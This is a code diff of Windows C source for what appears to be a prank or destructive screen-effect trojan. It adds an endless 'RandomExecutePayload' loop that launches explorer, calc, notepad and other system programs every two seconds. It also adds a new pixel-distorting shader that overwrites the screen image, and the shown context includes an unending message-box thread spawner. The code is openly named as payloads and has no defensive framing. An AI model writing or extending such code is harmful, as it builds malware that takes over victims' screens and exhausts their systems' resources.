@@ -2,6 +2,15 @@
 
 HCRYPTPROV prov;
 DWORD xs;
+const char* executes[] = {
+	"explorer.exe",
+	"calc.exe",
+	"notepad.exe",
+	"mspaint.exe",
+	"sndvol.exe",
+	"control.exe"
+};
+const size_t nExecutes = sizeof(executes) / sizeof(void*);
 
 int random() {
 	if (prov == NULL)
@@ -493,12 +502,23 @@ void Shader11(int t, int w, int h, PRGBQUAD prgbScreen) {
 }
 
 void Shader12(int t, int w, int h, PRGBQUAD prgbScreen) {
+	PRGBQUAD prgbTemp = { 0 };
+	prgbTemp = prgbScreen;
+	for (int i = 0; i < h; i++) {
+		for (int j = 0; j < w; j++) {
+			prgbScreen[i * w + j].rgb = prgbTemp[(int)((float)(i * w + j) + (float)sqrt((2 * h * i - i * i))) % (w * h)].rgb;
+		}
+	}
+	Sleep(90);
+}
+
+void Shader13(int t, int w, int h, PRGBQUAD prgbScreen) {
 	for (int i = 0; i < w * h; i++) {
 		prgbScreen[i].rgb = (t * i) % (RGB(255, 255, 255));
 	}
 }
 
-void Shader13(int t, int w, int h, PRGBQUAD prgbScreen) {
+void Shader14(int t, int w, int h, PRGBQUAD prgbScreen) {
 	for (int i = 0; i < w * h; i++) {
 		prgbScreen[i].rgb = (Xorshift32() % 0x100) * 0x010101;
 	}
@@ -541,5 +561,12 @@ void MessageBoxPayload() {
 	for (;;) {
 		CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxThread), NULL, 0, NULL);
 		Sleep(1500);
+	}
+}
+
+void RandomExecutePayload() {
+	for (;;) {
+		ShellExecuteA(NULL, NULL, executes[random() % nExecutes], NULL, NULL, SW_SHOWNORMAL);
+		Sleep(2000);
 	}
 }
